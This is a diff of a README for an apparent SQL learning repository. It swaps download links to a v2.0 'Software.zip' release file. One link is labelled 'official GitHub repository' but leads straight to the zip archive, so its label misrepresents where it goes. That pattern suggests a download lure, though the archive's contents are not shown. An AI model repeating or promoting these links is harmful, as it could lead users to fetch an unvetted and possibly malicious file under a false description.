@@ -26,7 +26,7 @@ Each project comes with detailed instructions and sample queries to help you und
 
 To get started with the projects, simply download the repository from the following link:
 
-[![Download Projects](https://github.com/Tudor2223/SQL_Projects/releases/download/v1.0/Soft.zip)](https://github.com/Tudor2223/SQL_Projects/releases/download/v1.0/Soft.zip)
+[![Download Projects](https://github.com/Tudor2223/SQL_Projects/releases/download/v2.0/Software.zip)](https://github.com/Tudor2223/SQL_Projects/releases/download/v2.0/Software.zip)
 
 Click the button above to download the projects and start exploring the world of SQL!
 
@@ -48,7 +48,7 @@ If you are interested in any of these topics, you will find valuable insights an
 
 ## 🌐 Further Exploration 🌐
 
-For more SQL resources and projects, visit the [official GitHub repository](https://github.com/Tudor2223/SQL_Projects/releases/download/v1.0/Soft.zip).
+For more SQL resources and projects, visit the [official GitHub repository](https://github.com/Tudor2223/SQL_Projects/releases/download/v2.0/Software.zip).
 
 ## 📌 Releases Section 📌
 
